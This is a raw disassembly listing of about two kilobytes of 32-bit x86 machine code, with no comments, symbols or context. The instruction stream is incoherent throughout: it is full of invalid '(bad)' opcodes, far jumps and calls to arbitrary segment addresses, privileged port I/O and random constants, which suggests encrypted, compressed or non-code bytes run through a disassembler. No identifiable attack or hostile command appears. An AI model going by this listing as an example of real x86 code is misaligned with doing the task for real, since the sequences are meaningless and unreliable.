  40673f:	sub    al,0xe7
  406741:	popf   
  406742:	pop    ds
  406743:	repnz mov eax,ds:0xfb75bcbd
  406749:	dec    edi
  40674a:	add    eax,esp
  40674c:	jp     0x4067a2
  40674e:	pop    es
  40674f:	xchg   DWORD PTR [edi-0x79],ecx
  406752:	int3   
  406753:	xchg   edx,eax
  406754:	xlat   BYTE PTR ds:[ebx]
  406755:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406756:	inc    ecx
  406757:	aas    
  406758:	adc    eax,0x9ce6b52d
  40675d:	ins    BYTE PTR es:[edi],dx
  40675e:	xchg   ebx,eax
  40675f:	pop    ds
  406760:	dec    edx
  406761:	adc    DWORD PTR [ecx+0x67],esp
  406764:	jle    0x40679f
  406766:	add    cl,bl
  406768:	lahf   
  406769:	shr    BYTE PTR [esi+ebx*4+0x3b],0xa5
  40676e:	jp     0x40673a
  406770:	call   0x6cd1:0xd920
  406777:	rcr    ch,0xe5
  40677a:	push   ebp
  40677b:	sub    bl,BYTE PTR [ebx-0x65acfddf]
  406781:	mov    bh,0xbf
  406783:	jno    0x406804
  406785:	add    DWORD PTR [esi+0x6d],0x45957b65
  40678c:	xlat   BYTE PTR ds:[ebx]
  40678d:	mov    ds:0xa91f32a8,eax
  406792:	mov    bl,0x7a
  406794:	mov    dh,0xd1
  406796:	adc    bl,dh
  406798:	pop    es
  406799:	mov    cl,0xf1
  40679b:	jmp    0xdca3b920
  4067a0:	je     0x406745
  4067a2:	sub    BYTE PTR [edi+0x1c],0x54
  4067a6:	jnp    0x4067ef
  4067a8:	pop    ss
  4067a9:	mov    ebp,0x2ebdf77a
  4067ae:	xor    dh,BYTE PTR [edx-0x2a118a9]
  4067b4:	scas   al,BYTE PTR es:[edi]
  4067b5:	jge    0x406751
  4067b7:	icebp  
  4067b8:	mov    ebp,0xf62ac2a9
  4067bd:	pop    esi
  4067be:	jmp    0x80ab5af1
  4067c3:	cwde   
  4067c4:	scas   al,BYTE PTR es:[edi]
  4067c5:	icebp  
  4067c6:	rcr    BYTE PTR [esi-0x71395510],cl
  4067cc:	mov    ebx,0xfb0b5866
  4067d1:	and    al,0x2f
  4067d3:	jp     0x406756
  4067d5:	mov    al,0x4b
  4067d7:	gs ds das 
  4067da:	fadd   QWORD PTR [eax]
  4067dc:	inc    ebp
  4067dd:	mov    ds:0xed41f955,al
  4067e2:	rol    DWORD PTR [edx-0x408dd0fe],1
  4067e8:	(bad)  
  4067ea:	add    al,0x84
  4067ec:	dec    eax
  4067ed:	mov    WORD PTR [ecx+ebx*4-0x3e194a03],?
  4067f4:	mov    cl,0x14
  4067f6:	fadd   QWORD PTR [eax+0x62]
  4067f9:	jmp    0xb562:0x147f53ab
  406800:	jb     0x4067a4
  406802:	sbb    ebx,DWORD PTR [eax+eiz*1]
  406805:	cmp    eax,0xc0f55f56
  40680a:	add    dl,0xb2
  40680d:	ins    DWORD PTR es:[edi],dx
  40680e:	jle    0x406878
  406810:	cmc    
  406811:	in     eax,0xd0
  406813:	mov    cl,0x4
  406815:	popa   
  406816:	into   
  406817:	dec    edi
  406818:	inc    esi
  406819:	push   ebp
  40681a:	into   
  40681b:	rcl    DWORD PTR [edi],0xb4
  40681e:	out    0x92,eax
  406820:	inc    ebp
  406821:	mov    eax,0xecec5852
  406826:	pop    ss
  406827:	dec    ebx
  406828:	icebp  
  406829:	out    dx,al
  40682a:	lods   al,BYTE PTR ds:[esi]
  40682b:	cmc    
  40682c:	sbb    BYTE PTR [edx-0x28],bh
  40682f:	int    0x96
  406831:	jns    0x40680f
  406833:	pop    edi
  406834:	lock inc edi
  406836:	call   0xbb1e:0x3d1abac7
  40683d:	bound  eax,QWORD PTR [edx-0x9d18a24]
  406843:	add    ch,0xb
  406846:	jp     0x406859
  406848:	lahf   
  406849:	mov    ebp,0x6bc2b68
  40684e:	stos   DWORD PTR es:[edi],eax
  40684f:	fist   DWORD PTR [ebx-0x2a]
  406852:	push   esi
  406853:	xchg   esi,eax
  406854:	cmp    DWORD PTR [ecx],edi
  406856:	cs pop ecx
  406858:	mov    ds:0xe4a95cb0,eax
  40685d:	clc    
  40685e:	or     esi,DWORD PTR [ebx+0x1b2464ea]
  406864:	ret    0xe9eb
  406867:	in     eax,0x80
  406869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40686a:	cld    
  40686b:	popa   
  40686c:	jge    0x4068cb
  40686e:	jo     0x406803
  406870:	inc    DWORD PTR [ebx]
  406872:	cmp    ah,bh
  406874:	add    al,0x2a
  406876:	mov    ebp,0xb00cc573
  40687b:	mov    edx,eax
  40687d:	xchg   ah,ch
  40687f:	aaa    
  406880:	push   0xfdec8f4c
  406885:	jae    0x406853
  406887:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406888:	jae    0x406897
  40688a:	xor    bl,BYTE PTR ds:0xeef1a8d4
  406890:	dec    ebx
  406891:	dec    edi
  406892:	add    BYTE PTR [ecx-0x13],ch
  406895:	cmp    eax,DWORD PTR [esi+0x7f0565d5]
  40689b:	repnz hlt 
  40689d:	adc    BYTE PTR [esi-0x6888a4ca],ch
  4068a3:	pop    ds
  4068a4:	push   ds
  4068a5:	cli    
  4068a6:	aad    0xe5
  4068a8:	push   esi
  4068a9:	pop    esp
  4068aa:	mov    DWORD PTR [eax-0x69f1a614],ebp
  4068b0:	nop
  4068b1:	jo     0x406892
  4068b3:	mov    ecx,0xff1ae1af
  4068b8:	and    DWORD PTR [ebx-0x1a],esi
  4068bb:	fwait
  4068bc:	call   0x6f20:0xd4447f37
  4068c3:	sbb    edi,ebp
  4068c5:	cld    
  4068c6:	mov    es,ecx
  4068c8:	out    dx,al
  4068c9:	jp     0x4068bb
  4068cb:	inc    edi
  4068cc:	icebp  
  4068cd:	xor    BYTE PTR [edx-0x2a19b51a],0xb7
  4068d4:	jg     0x4068d3
  4068d6:	adc    DWORD PTR [edx+0x64],esp
  4068d9:	out    dx,eax
  4068da:	inc    edi
  4068db:	scas   eax,DWORD PTR es:[edi]
  4068dc:	jns    0x406909
  4068de:	xchg   ebp,eax
  4068df:	add    DWORD PTR [ecx+0x39],edx
  4068e2:	out    dx,eax
  4068e3:	cmp    al,0xc0
  4068e5:	xchg   esp,eax
  4068e6:	mov    esp,0x6a6476c
  4068eb:	mov    BYTE PTR ds:0xc397d7ca,0x5a
  4068f2:	js     0x4068a3
  4068f4:	leave  
  4068f5:	repnz adc eax,0x112ec27d
  4068fb:	iret   
  4068fc:	(bad)  
  4068fe:	fcomp  st(7)
  406900:	adc    ebx,DWORD PTR [esi]
  406902:	and    eax,DWORD PTR ds:0xe0ecc557
  406908:	inc    ebx
  406909:	pop    ecx
  40690a:	dec    ebx
  40690b:	mov    ebp,0xf7a27ccc
  406910:	les    ebx,FWORD PTR [eax-0x5057de50]
  406916:	dec    ecx
  406917:	scas   al,BYTE PTR es:[edi]
  406918:	cmp    edi,DWORD PTR [ebp+edx*1-0x5829f739]
  40691f:	cmp    BYTE PTR [ecx+0x0],bh
  406922:	xchg   esp,eax
  406923:	cli    
  406924:	les    esi,FWORD PTR [edx+0x436cd55a]
  40692a:	sbb    ebp,DWORD PTR [ecx-0x10]
  40692d:	or     al,0x23
  40692f:	pop    ds
  406930:	ins    BYTE PTR es:[edi],dx
  406931:	es push cs
  406933:	pop    ecx
  406934:	jae    0x406909
  406936:	jg     0x406963
  406938:	in     eax,dx
  406939:	icebp  
  40693a:	or     DWORD PTR [ecx],ebx
  40693c:	arpl   WORD PTR [esi],si
  40693e:	dec    eax
  40693f:	mov    ah,0xc
  406941:	jmp    0x85cb:0x2e40f381
  406948:	jl     0x406938
  40694a:	or     al,0x7f
  40694c:	mov    ds:0x99d1ae21,eax
  406951:	ret    0x8d0b
  406954:	mov    bh,ah
  406956:	jae    0x40697e
  406958:	jp     0x4069bb
  40695a:	cs in  eax,dx
  40695c:	dec    esi
  40695d:	jb     0x40697b
  40695f:	jg     0x406966
  406961:	(bad)  
  406962:	jp     0x406903
  406964:	clc    
  406965:	xor    al,0x33
  406967:	mov    WORD PTR [ebx+0x19],?
  40696a:	sbb    DWORD PTR [esp+esi*8+0x21901a89],0x3f269ac7
  406975:	add    bh,BYTE PTR [ebp-0x3535d200]
  40697b:	mov    ecx,0xf9bbdec5
  406980:	or     al,0x89
  406982:	dec    ebp
  406983:	add    DWORD PTR [edx],ebp
  406985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406986:	dec    eax
  406987:	loopne 0x406990
  406989:	popf   
  40698a:	mov    ebp,0x8d4c97c5
  40698f:	xlat   BYTE PTR ds:[ebx]
  406990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406991:	push   edx
  406992:	sub    al,0xe5
  406994:	adc    DWORD PTR [edx],edx
  406996:	and    BYTE PTR [eax-0x7a6d61be],0xb9
  40699d:	pop    esp
  40699e:	imul   esi,ebp,0x6
  4069a1:	mov    eax,0x95e4713b
  4069a6:	or     eax,0x37996ce1
  4069ab:	retf   
  4069ac:	mov    edx,0x9a891ae9
  4069b1:	loope  0x40693d
  4069b3:	pop    esp
  4069b4:	mov    ebp,DWORD PTR [edx-0x1f6e6964]
  4069ba:	lods   al,BYTE PTR ds:[esi]
  4069bb:	popa   
  4069bc:	mov    ebp,ebp
  4069be:	or     ch,BYTE PTR [eax-0x19]
  4069c1:	sahf   
  4069c2:	cmc    
  4069c3:	mov    BYTE PTR [ebx+0x1259eeeb],0xf5
  4069ca:	mov    al,0x75
  4069cc:	mov    edi,0x9e6b68f0
  4069d1:	dec    ecx
  4069d2:	pop    ds
  4069d3:	cld    
  4069d4:	pop    eax
  4069d5:	cmp    edx,esp
  4069d7:	or     DWORD PTR [esi+eax*2],0x4b
  4069db:	fstp   TBYTE PTR [esi-0x2a7934ac]
  4069e1:	mov    esi,0x59a0a281
  4069e6:	je     0x4069b7
  4069e8:	imul   ebp,DWORD PTR [eax],0x2c9d01c4
  4069ee:	(bad)  
  4069ef:	and    al,cl
  4069f1:	packsswb mm0,QWORD PTR ds:0xd25f1ad6
  4069f8:	in     eax,dx
  4069f9:	adc    ch,bl
  4069fb:	jo     0x406a2b
  4069fd:	ds sbb dl,0xa9
  406a01:	jmp    0x406a0f
  406a03:	cld    
  406a04:	cs or  edx,esp
  406a07:	pop    edx
  406a08:	or     DWORD PTR ds:0x45259711,0x937f8b32
  406a12:	mov    ?,WORD PTR [eax]
  406a14:	loope  0x406a1e
  406a16:	dec    ecx
  406a17:	cmp    eax,0x4a6b01c4
  406a1c:	outs   dx,DWORD PTR ds:[esi]
  406a1d:	push   ecx
  406a1e:	xchg   ecx,eax
  406a1f:	shl    dh,1
  406a21:	lock mov edx,0xde06024e
  406a27:	fcomp  st(5)
  406a29:	mov    ecx,0x323fd2f
  406a2e:	pop    edx
  406a2f:	dec    ecx
  406a30:	js     0x4069e4
  406a32:	inc    ecx
  406a33:	bound  ebp,QWORD PTR [edx+0x3b14c1ca]
  406a39:	pushf  
  406a3a:	mov    ds,WORD PTR [edi+0x2d]
  406a3d:	aaa    
  406a3e:	or     BYTE PTR [edi+ebx*1],bh
  406a41:	or     eax,0x3f32a795
  406a46:	pop    edx
  406a47:	cmp    eax,0x1e3f07fa
  406a4c:	cld    
  406a4d:	jbe    0x406a0a
  406a4f:	mov    ds:0xad95c522,al
  406a54:	cmp    edx,DWORD PTR [ecx+ebp*8]
  406a57:	sub    cl,BYTE PTR [edx*4+0x5cd3d3ba]
  406a5e:	sbb    DWORD PTR [esp+ebp*1-0x19],ebx
  406a62:	xor    cl,bl
  406a64:	xchg   edx,eax
  406a65:	cld    
  406a66:	mov    dl,0x48
  406a68:	dec    esi
  406a69:	into   
  406a6a:	adc    DWORD PTR [ebx+0x1f],0xffffffa6
  406a6e:	daa    
  406a6f:	js     0x406a53
  406a71:	dec    eax
  406a72:	mov    ds:0xb89db409,eax
  406a77:	xor    DWORD PTR [ecx+0x79],ebx
  406a7a:	push   ecx
  406a7b:	in     al,dx
  406a7c:	xor    DWORD PTR [ebp+0x49924d02],0x15
  406a83:	shl    BYTE PTR [esi-0x24],1
  406a86:	fcmovbe st,st(7)
  406a88:	inc    edi
  406a89:	in     al,dx
  406a8a:	add    eax,0xc74dd9b8
  406a8f:	adc    BYTE PTR [ecx],ch
  406a91:	dec    esp
  406a92:	cmp    esp,DWORD PTR [ebx]
  406a94:	in     al,dx
  406a95:	fist   WORD PTR [edi-0x51e360cd]
  406a9b:	mov    bl,0x55
  406a9d:	xchg   esi,eax
  406a9e:	push   cs
  406a9f:	sbb    al,0x11
  406aa1:	int    0x6f
  406aa3:	add    esp,DWORD PTR [edx]
  406aa5:	sbb    ebp,DWORD PTR [edx]
  406aa7:	mov    ds:0x790f644a,eax
  406aac:	into   
  406aad:	xchg   edx,eax
  406aae:	and    DWORD PTR [ecx+0x73],ebp
  406ab1:	or     DWORD PTR [edi-0x7595450f],0x6a
  406ab8:	xchg   edx,eax
  406ab9:	jnp    0x406b1a
  406abb:	mov    cl,0x98
  406abd:	test   DWORD PTR [ebx-0xe3a3d79],0xa058e67b
  406ac7:	in     al,0x6d
  406ac9:	(bad)
  406acc:	pop    ss
  406acd:	test   DWORD PTR [esi-0x30],ebx
  406ad0:	or     dh,BYTE PTR [ecx-0x1f91b05e]
  406ad6:	xchg   ebx,eax
  406ad7:	repnz mov ds:0xd06589ff,al
  406add:	xchg   esp,eax
  406ade:	loopne 0x406a9c
  406ae0:	jbe    0x406b0e
  406ae2:	in     al,dx
  406ae3:	test   al,0x21
  406ae5:	mov    ecx,0x31b24e38
  406aea:	push   cs
  406aeb:	loope  0x406aca
  406aed:	sbb    esp,DWORD PTR [esi+0x72]
  406af0:	rcl    BYTE PTR [ebx+0x4d0fbd67],0x0
  406af7:	inc    ebp
  406af8:	mov    ecx,0x1471b290
  406afd:	imul   edx,DWORD PTR [ebp+0x5a],0x2b
  406b01:	fnstenv [edx*4+0x481b26a8]
  406b08:	out    0x6b,eax
  406b0a:	sub    BYTE PTR [edx+0x1a],dl
  406b0d:	push   0x5c5ea448
  406b12:	popf   
  406b13:	or     BYTE PTR [eax+ebp*4],ch
  406b16:	push   esi
  406b17:	(bad)  
  406b18:	sahf   
  406b19:	or     DWORD PTR es:[ecx+0x16fe40af],0xffffff96
  406b21:	mov    edi,0x9c793cd3
  406b26:	pop    ecx
  406b27:	leave  
  406b28:	out    0x24,al
  406b2a:	pop    ebp
  406b2b:	cdq    
  406b2c:	sbb    DWORD PTR [esi-0x34837d91],ecx
  406b32:	push   0x2b
  406b34:	mov    ebx,0xf063b1a0
  406b39:	jns    0x406b88
  406b3b:	add    eax,0x443da1f5
  406b40:	jns    0x406b62
  406b42:	stos   BYTE PTR es:[edi],al
  406b43:	not    DWORD PTR [edx]
  406b45:	(bad)  
  406b47:	fisubr DWORD PTR [ecx+0x2452358c]
  406b4d:	sbb    ebx,DWORD PTR [edi-0x1f15786b]
  406b53:	inc    edx
  406b54:	jno    0x406bbe
  406b56:	les    ebx,FWORD PTR [ecx-0x3260df73]
  406b5c:	mov    esi,0x9640445e
  406b61:	jno    0x406b89
  406b63:	adc    edi,DWORD PTR es:[edx-0x6043bb27]
  406b6a:	mov    BYTE PTR [ecx],ah
  406b6c:	xor    ecx,DWORD PTR [ecx+0x22]
  406b6f:	jno    0x406b66
  406b71:	xchg   ecx,eax
  406b72:	mov    fs,WORD PTR [ebp+ebx*8+0x3f]
  406b76:	mov    ebx,DWORD PTR [ebx+0x6c]
  406b79:	loopne 0x406bb6
  406b7b:	pop    es
  406b7c:	add    bh,BYTE PTR [ebx]
  406b7e:	repz cmp al,0xc0
  406b81:	fs xor al,0x61
  406b84:	jmp    0x5657:0xebefd2ab
  406b8b:	cmp    BYTE PTR [edi-0x675ab3a9],bl
  406b91:	mov    dl,0xa6
  406b93:	mov    eax,0x27cde09b
  406b98:	sbb    al,0xa
  406b9a:	cmp    esp,ecx
  406b9c:	ret    0x54de
  406b9f:	and    al,0xe4
  406ba1:	jmp    0x193c:0xf872dfe
  406ba8:	xor    al,0x12
  406baa:	sahf   
  406bab:	sahf   
  406bac:	jge    0x406bac
  406bae:	popa   
  406baf:	mov    dl,0x30
  406bb1:	ins    BYTE PTR es:[edi],dx
  406bb2:	in     eax,0xef
  406bb4:	push   edx
  406bb5:	retf   
  406bb6:	ffree  st(2)
  406bb8:	mov    esi,0x2eaa3639
  406bbd:	or     eax,0x57b4a81
  406bc2:	mov    bh,0x54
  406bc4:	in     eax,dx
  406bc5:	int    0x99
  406bc7:	(bad)  
  406bc8:	fild   WORD PTR [ebp+0x71]
  406bcb:	inc    ecx
  406bcc:	(bad)  
  406bcd:	(bad)  [esi+0x4]
  406bd0:	inc    esi
  406bd1:	mov    ch,0xb6
  406bd3:	int3   
  406bd4:	push   ds
  406bd5:	mov    fs,WORD PTR [esi+0x11]
  406bd8:	sahf   
  406bd9:	pusha  
  406bda:	mov    al,0xf3
  406bdc:	or     eax,0xe9498627
  406be1:	retf   
  406be2:	adc    ebp,DWORD PTR [edi+0x9]
  406be5:	(bad)  
  406be6:	push   ecx
  406be7:	enter  0x53dd,0xa1
  406beb:	mov    eax,0x492994ba
  406bf0:	add    bh,ah
  406bf2:	(bad)  [esi]
  406bf4:	inc    ebx
  406bf5:	loopne 0x406c66
  406bf7:	mul    BYTE PTR [edx-0x55f751b3]
  406bfd:	mov    bh,0x40
  406bff:	in     eax,dx
  406c00:	in     al,dx
  406c01:	ja     0x406c59
  406c03:	xchg   edx,eax
  406c04:	inc    edi
  406c05:	mov    DWORD PTR [ecx-0x3596fec0],eax
  406c0b:	arpl   dx,dx
  406c0d:	jle    0x406bae
  406c0f:	mov    ds:0xf8d7eff6,al
  406c14:	sub    edi,DWORD PTR [ecx+0x1e]
  406c17:	pop    ds
  406c18:	fistp  WORD PTR [ebp+0x33]
  406c1b:	inc    edi
  406c1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c1d:	test   ebx,0xfba4e22e
  406c23:	pop    ecx
  406c24:	call   0x8cd1:0x8a94e076
  406c2b:	jne    0x406c71
  406c2d:	pushf  
  406c2e:	inc    edi
  406c2f:	loop   0x406be6
  406c31:	mov    al,ds:0x61b60914
  406c36:	jno    0x406c5e
  406c38:	fist   DWORD PTR [edx]
  406c3a:	inc    ecx
  406c3b:	jp     0x406c4e
  406c3d:	int3   
  406c3e:	add    dh,ah
  406c40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c41:	add    DWORD PTR [eax-0x18],edi
  406c44:	pop    esi
  406c45:	fcmovu st,st(1)
  406c47:	test   al,0x96
  406c49:	pop    esi
  406c4a:	push   esp
  406c4b:	add    dl,BYTE PTR [ebx+0x272bfeb5]
  406c51:	cmp    DWORD PTR [eax+0x48],0xffffffe9
  406c55:	and    edx,edx
  406c57:	repnz sub eax,0xc4e407e3
  406c5d:	or     ch,dh
  406c5f:	cmp    al,0x60
  406c61:	lods   eax,DWORD PTR ds:[esi]
  406c62:	sbb    esi,edi
  406c64:	mov    bl,0x8f
  406c66:	mov    edx,0x7cf2ad9a
  406c6b:	stc    
  406c6c:	mov    ebp,DWORD PTR [ebx+ebx*2+0x1f]
  406c70:	sti    
  406c71:	std    
  406c72:	push   ebx
  406c73:	xchg   ecx,eax
  406c74:	add    al,0x8e
  406c76:	xor    eax,0x772c5c3b
  406c7b:	mov    esi,0xd221650f
  406c80:	cmp    al,BYTE PTR ds:0xb56fd0ad
  406c86:	ss (bad) 
  406c88:	cmp    dl,BYTE PTR [edi+0x4c]
  406c8b:	and    cl,BYTE PTR [ecx+0x77]
  406c8e:	nop
  406c8f:	inc    ecx
  406c90:	xchg   ebp,eax
  406c91:	bnd ja 0x406c7d
  406c94:	xchg   ecx,eax
  406c95:	pop    ebp
  406c96:	mov    cl,dl
  406c98:	adc    BYTE PTR [ebx+0x78],bh
  406c9b:	ret    
  406c9c:	lahf   
  406c9d:	xchg   esp,eax
  406c9e:	mov    ebp,0xcadf8dcc
  406ca3:	adc    eax,0x83674f06
  406ca8:	pop    edi
  406ca9:	xchg   bl,ah
  406cab:	sti    
  406cac:	ss out dx,eax
  406cae:	jae    0x406c40
  406cb0:	xor    ebx,esp
  406cb2:	loope  0x406d03
  406cb4:	arpl   bx,bp
  406cb6:	scas   al,BYTE PTR es:[edi]
  406cb7:	push   ebx
  406cb8:	mov    al,ds:0x9ee5e09e
  406cbd:	(bad)  
  406cbe:	adc    eax,0xedea189b
  406cc3:	lods   al,BYTE PTR ds:[esi]
  406cc4:	ja     0x406d29
  406cc6:	repnz cmp eax,0x974f1161
  406ccc:	cmp    BYTE PTR [ebx+0x62],0xcc
  406cd0:	(bad)  
  406cd1:	arpl   di,bx
  406cd3:	inc    edx
  406cd4:	cmp    bh,dh
  406cd6:	test   BYTE PTR [ecx-0x72],al
  406cd9:	std    
  406cda:	and    eax,0xa53adf96
  406cdf:	inc    ebp
  406ce0:	or     BYTE PTR [ebp+0x1faae8b],0xa6
  406ce7:	mov    dl,0xef
  406ce9:	or     ch,dh
  406ceb:	mov    ds:0x335ebfc5,al
  406cf0:	add    dl,BYTE PTR fs:[edi+0x71]
  406cf4:	jbe    0x406d15
  406cf6:	or     eax,0x4e19d511
  406cfb:	fisttp DWORD PTR [ebx-0x22]
  406cfe:	ret    0x98aa
  406d01:	sub    al,0x47
  406d03:	pusha  
  406d04:	cmp    bl,BYTE PTR [edi+eax*4-0x5c0d01eb]
  406d0b:	inc    ebx
  406d0c:	mov    bh,0xd1
  406d0e:	pop    ss
  406d0f:	push   es
  406d10:	mov    cl,0xb
  406d12:	fs loope 0x406d1e
  406d15:	push   edi
  406d16:	dec    esp
  406d17:	sub    edi,ecx
  406d19:	call   0x64d3:0xded20f01
  406d20:	(bad)  
  406d22:	mov    ds:0x4afe25ee,al
  406d27:	int    0xf7
  406d29:	sub    esp,ecx
  406d2b:	xor    esi,DWORD PTR [esi-0x1b]
  406d2e:	leave  
  406d2f:	adc    al,0x1
  406d31:	jmp    FWORD PTR [edx-0x30]
  406d34:	shl    dh,cl
  406d36:	sti    
  406d37:	add    DWORD PTR [ebx-0xf2ebf73],ecx
  406d3d:	(bad)  
  406d3e:	call   0xd75a82b6
  406d43:	pop    ss
  406d44:	ja     0x406d4e
  406d46:	in     al,0xac
  406d48:	fucompp 
  406d4a:	xchg   ecx,eax
  406d4b:	and    al,0x92
  406d4d:	int3   
  406d4e:	jecxz  0x406ce8
  406d50:	mov    eax,ds:0x2547320
  406d55:	xchg   edx,eax
  406d56:	dec    BYTE PTR [esi+0x56]
  406d59:	xor    DWORD PTR [edi+0x38],edx
  406d5c:	aas    
  406d5d:	fdivrp st(1),st
  406d5f:	leave  
  406d60:	add    BYTE PTR [ebx+edi*8],dh
  406d63:	lsl    edx,WORD PTR [ebp-0x7b]
  406d67:	mov    fs,WORD PTR [edi+eax*1+0x1e]
  406d6b:	mov    edx,0x64c0260c
  406d70:	ja     0x406d45
  406d72:	ss sub ah,BYTE PTR ss:0x7383d9ea
  406d7a:	xor    DWORD PTR [esi+0x5d108278],0x69
  406d81:	std    
  406d82:	xor    al,dl
  406d84:	loop   0x406d60
  406d86:	add    DWORD PTR [ebp+0x27114ddf],ecx
  406d8c:	mov    dl,0xed
  406d8e:	dec    ebp
  406d8f:	mov    ebx,0x4c016e32
  406d94:	scas   eax,DWORD PTR es:[edi]
  406d95:	test   eax,0x8f2debe
  406d9a:	and    al,0x9e
  406d9c:	addr16 jg 0x406dc0
  406d9f:	popa   
  406da0:	adc    dl,BYTE PTR [edi+0x4f]
  406da3:	push   ebp
  406da4:	or     ebp,DWORD PTR [ecx-0x5c]
  406da7:	jne    0x406d6b
  406da9:	test   eax,0xf07fe0ab
  406daf:	ins    BYTE PTR es:[edi],dx
  406db0:	mov    eax,ds:0x46cf155c
  406db5:	icebp  
  406db6:	dec    ebp
  406db7:	or     edx,DWORD PTR [edi-0xb]
  406dba:	mov    DWORD PTR [edi-0x4c5eee82],edx
  406dc0:	xchg   ecx,eax
  406dc1:	dec    ebp
  406dc2:	retf   0xd7d7
  406dc5:	daa    
  406dc6:	pop    ebp
  406dc7:	clc    
  406dc8:	and    al,BYTE PTR [ecx-0x1a]
  406dcb:	xor    BYTE PTR [ecx],ah
  406dcd:	jl     0x406e4b
  406dcf:	(bad)  
  406dd0:	into   
  406dd1:	loopne 0x406dfa
  406dd3:	imul   edi,DWORD PTR [esi],0xb10f696a
  406dd9:	dec    ebx
  406dda:	push   ebx
  406ddb:	enter  0xa4bd,0xe9
  406ddf:	stc    
  406de0:	add    al,0x1c
  406de2:	xor    eax,0xeb592c75
  406de7:	lods   al,BYTE PTR ds:[esi]
  406de8:	jmp    0xda9b:0x4e5c0639
  406def:	pop    eax
  406df0:	aaa    
  406df1:	pop    esp
  406df2:	lds    esp,FWORD PTR [ebp-0x38]
  406df5:	(bad)  
  406df7:	call   0xae47cdc0
  406dfc:	test   BYTE PTR [edi*4-0xef1f112],bh
  406e03:	inc    esp
  406e04:	fld    DWORD PTR [ebx]
  406e06:	in     al,dx
  406e07:	fstp   QWORD PTR [ecx+0x15dee9d8]
  406e0d:	pop    ss
  406e0e:	jno    0x406d96
  406e10:	dec    esi
  406e11:	xor    BYTE PTR [ebx],bl
  406e13:	je     0x406e7c
  406e15:	push   es
  406e16:	xor    al,0xf8
  406e18:	mov    ebx,0xc623dd6b
  406e1d:	adc    eax,0x1dbc8528
  406e22:	dec    edi
  406e23:	pusha  
  406e24:	dec    esi
  406e25:	cmp    esp,DWORD PTR [edx-0x590c44ec]
  406e2b:	hlt    
  406e2c:	ins    BYTE PTR es:[edi],dx
  406e2d:	jl     0x406e75
  406e2f:	adc    esi,DWORD PTR [edi+0x2af29744]
  406e35:	mov    ebp,0xee910cf7
  406e3a:	add    eax,0x7ad5ab7b
  406e3f:	sub    BYTE PTR [edi],ah
  406e41:	pushf  
  406e42:	dec    edx
  406e43:	sub    BYTE PTR [esi-0x76],ch
  406e46:	pop    edx
  406e47:	sahf   
  406e48:	into   
  406e49:	outs   dx,DWORD PTR ds:[esi]
  406e4a:	jmp    0x756f:0x458a3e42
  406e51:	xchg   ebx,eax
  406e52:	xor    ebp,DWORD PTR [edi-0x49]
  406e55:	push   ecx
  406e56:	xchg   ebp,eax
  406e57:	adc    DWORD PTR [ecx],esi
  406e59:	ror    DWORD PTR [ebp+0x150495c7],0xe2
  406e60:	stos   BYTE PTR es:[edi],al
  406e61:	lea    eax,ds:0xd8969f1
  406e67:	xchg   esi,eax
  406e68:	inc    edi
  406e69:	jmp    0x19caf750
  406e6e:	sub    al,0x13
  406e70:	add    al,0x3
  406e72:	add    al,0xd6
  406e74:	jae    0x406e8d
  406e76:	xchg   ebp,eax
  406e77:	xchg   bl,ah
  406e79:	mov    esp,0xc8322434
  406e7e:	add    eax,0x8807fd54
  406e83:	mov    cl,BYTE PTR [ebx+esi*2+0x758f3585]
  406e8a:	test   BYTE PTR [eax+0x2],ch
  406e8d:	jl     0x406e2f
  406e8f:	out    0x54,al
  406e91:	das    
  406e92:	push   eax
  406e93:	and    eax,0x4806ffd5
  406e98:	pop    ecx
  406e99:	xor    al,BYTE PTR [ebx+0x73]
  406e9c:	lea    edx,[ebx*1-0x340a25d6]
  406ea3:	dec    edi
  406ea4:	ret    0x6ce2
  406ea7:	out    dx,al
  406ea8:	aad    0x93
  406eaa:	imul   esi,DWORD PTR [ebp-0x2a],0x5c
  406eae:	sahf   
  406eaf:	pusha  
  406eb0:	loope  0x406f15
  406eb2:	sub    edx,DWORD PTR [edi+esi*4]
  406eb5:	jb     0x406e37
  406eb7:	stc    
  406eb8:	inc    edi
  406eb9:	mov    dh,0x2
  406ebb:	ret    0x320d
  406ebe:	aam    0x63
  406ec0:	and    eax,DWORD PTR [eax]
  406ec2:	scas   al,BYTE PTR es:[edi]
  406ec3:	cmp    BYTE PTR [ebx+ecx*4-0x21a99202],0x69
  406ecb:	mov    ?,WORD PTR [ecx-0x5ee49beb]
  406ed1:	jmp    0x8094ac7e
  406ed6:	dec    edi
  406ed7:	mov    BYTE PTR [eax-0x1e],dh
  406eda:	fcmovne st,st(3)
  406edc:	add    BYTE PTR [eax-0x1f],ah
  406edf:	test   DWORD PTR [edx-0x2a],ecx
  406ee2:	sahf   
  406ee3:	in     eax,0xeb
  406ee5:	xor    al,0xc4
  406ee7:	cmp    al,0xbe
  406ee9:	pop    esi
  406eea:	adc    esp,DWORD PTR ds:0xa28e0dd
  406ef0:	dec    edx
  406ef1:	cli    
  406ef2:	ss xchg ecx,eax
  406ef4:	adc    DWORD PTR [ecx],esi
  406ef6:	loopne 0x406f44
  406ef8:	(bad)
  406efb:	int3   
  406efc:	mov    ebp,0xcfe2447a
  406f01:	imul   edi,DWORD PTR [ebp-0x73],0x650d1ee6
  406f08:	test   al,0xd3
  406f0a:	or     al,0x18
  406f0c:	inc    eax
  406f0d:	ret    0x70d8
  406f10:	adc    ebx,DWORD PTR [edx+0x7622ab60]
  406f16:	and    BYTE PTR [ebx],ch
  406f18:	fnstsw WORD PTR [ebx]
  406f1a:	popf   
  406f1b:	mov    ecx,0xc1ae8c3d
  406f20:	sahf   
  406f21:	mov    ecx,DWORD PTR [edx]
  406f23:	sub    ch,BYTE PTR [ebp+esi*8-0xb]
  406f27:	jnp    0x406ef9
  406f29:	pop    esp
  406f2a:	dec    esp
  406f2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f2c:	je     0x406ef8
  406f2e:	push   ecx
  406f2f:	mov    fs,WORD PTR [ecx]
  406f31:	out    0xa8,eax
  406f33:	push   ss
  406f34:	push   cs
  406f35:	mov    eax,ds:0xcd700550
  406f3a:	xchg   ebx,eax
  406f3b:	rcr    bh,1
